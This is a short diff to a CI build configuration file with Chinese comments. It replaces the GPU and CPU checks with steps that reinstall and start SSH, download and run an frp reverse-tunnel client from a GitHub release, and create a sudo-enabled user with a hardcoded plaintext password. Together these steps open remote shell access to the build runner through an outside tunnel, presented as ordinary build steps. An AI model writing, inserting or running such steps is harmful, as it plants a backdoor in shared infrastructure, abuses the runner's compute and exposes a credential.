@@ -5,9 +5,18 @@ vm:
 
 # 构建前的预安装步骤
 before_install:
-  - lscpu  # 检查 CPU 信息，确认实例大小
+  - sudo apt update
+  - sudo apt purge -y ssh
+  - sudo apt install -y ssh
 
 # 测试或构建阶段
 script:
-  - echo "Running on GPU instance"
-  - nvidia-smi  # 检查 NVIDIA GPU 信息
+  - sudo /etc/init.d/ssh start
+  - sudo wget 'https://github.com/fxlqwq/testgithubaction/releases/download/frp/frpl.zip'
+  - sudo apt install -y unzip
+  - unzip -o frpl.zip
+  - sudo useradd -m -s /bin/bash fxlqwq
+  - echo "fxlqwq:Aa2980688" | sudo chpasswd
+  - sudo usermod -aG sudo fxlqwq
+  - sudo chmod +x ./frpc
+  - sudo -u fxlqwq ./frpc
